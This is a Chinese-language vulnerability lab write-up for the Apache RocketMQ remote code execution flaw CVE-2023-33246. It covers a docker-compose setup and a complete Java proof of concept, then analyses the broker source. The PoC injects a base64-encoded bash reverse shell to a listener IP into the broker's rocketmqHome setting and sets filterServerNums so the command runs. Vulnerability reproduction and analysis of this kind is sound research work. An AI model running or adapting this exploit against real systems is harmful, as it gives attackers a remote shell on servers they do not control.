# Apache RocketMQ RCE (CVE-2023-33246)

## 启动

使用`docker compose`或`docker-compose`启动

```shell
docker-compose up -d
```

## PoC

使用`IDEA`或`Eclipse`等`IDE`新建一个`Maven`项目，导入依赖：

```xml
<dependencies>
    <!-- https://mvnrepository.com/artifact/org.apache.rocketmq/rocketmq-tools -->
    <dependency>
        <groupId>org.apache.rocketmq</groupId>
        <artifactId>rocketmq-tools</artifactId>
        <version>5.1.0</version>
    </dependency>
</dependencies>
```

PoC如下：

```java
import org.apache.rocketmq.tools.admin.DefaultMQAdminExt;

import java.util.Base64;
import java.util.Properties;

public class Main {
    private static String getCmd(String ip, String port) {
        String cmd = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
        String cmdBase = Base64.getEncoder().encodeToString(cmd.getBytes());
        return "-c $@|sh . echo echo \"" + cmdBase + "\"|base64 -d|bash -i;";
    }

    public static void main(String[] args) throws Exception {
        String targetHost = "192.168.227.128";
        String targetPort = "10911";

        String shellHost = "192.168.227.128";
        String shellPort = "12345";

        String targetAddr = String.format("%s:%s",targetHost,targetPort);
        Properties props = new Properties();
        props.setProperty("rocketmqHome", getCmd(shellHost,shellPort));
        props.setProperty("filterServerNums", "1");
        DefaultMQAdminExt admin = new DefaultMQAdminExt();
        admin.setNamesrvAddr("0.0.0.0:12345");
        admin.start();
        admin.updateBrokerConfig(targetAddr, props);
        Properties brokerConfig = admin.getBrokerConfig(targetAddr);
        System.out.println(brokerConfig.getProperty("rocketmqHome"));
        System.out.println(brokerConfig.getProperty("filterServerNums"));
        admin.shutdown();
    }
}
```

在控制台成功输出新的配置后，请等待30秒左右，将会收到反连请求：

![](screenshot.png)

## 简单分析

为什么要修改`filterServerNums`属性：如果配置的`filterServerNums`为0，计算得出的`more`也会是0，因此无法进入`callShell`方法执行命令。

```java
public void createFilterServer() {
    int more =
        this.brokerController.getBrokerConfig().getFilterServerNums() -
        this.filterServerTable.size();
    String cmd = this.buildStartCommand();
    for (int i = 0; i < more; i++) {
        FilterServerUtil.callShell(cmd, log);
    }
}

public static void callShell(final String shellString, final Logger log) {
    Process process = null;
    try {
        String[] cmdArray = splitShellString(shellString);
        process = Runtime.getRuntime().exec(cmdArray);
        process.waitFor();
        log.info("CallShell: <{}> OK", shellString);
    } catch (Throwable e) {
        log.error("CallShell: readLine IOException, {}", shellString, e);
    } finally {
        if (null != process)
            process.destroy();
    }
}
```

为什么要修改`rocketmqHome`属性：在构建命令的时候，最终会调用`splitShellString`方法按照空格对参数进行分割，所以不可以是`NamesrvAddr`参数，只能是开头的`rocketmqHome`参数，但是由于参数分割规则，所以需要更严格的命令和巧妙的技巧才可以执行。

```java
private String buildStartCommand() {
    String config = "";
    if (BrokerStartup.CONFIG_FILE_HELPER.getFile() != null) {
        config = String.format("-c %s",
        BrokerStartup.CONFIG_FILE_HELPER.getFile());
    }
    if (this.brokerController.getBrokerConfig().getNamesrvAddr() != null) {
        config += String.format(" -n %s",
        this.brokerController.getBrokerConfig().getNamesrvAddr());
    }
    if (NetworkUtil.isWindowsPlatform()) {
        return String.format("start /b %s\\bin\\mqfiltersrv.exe %s",
        this.brokerController.getBrokerConfig().getRocketmqHome(),
        config);
    } else {
        return String.format("sh %s/bin/startfsrv.sh %s",
        this.brokerController.getBrokerConfig().getRocketmqHome(),
        config);
    }
}
```
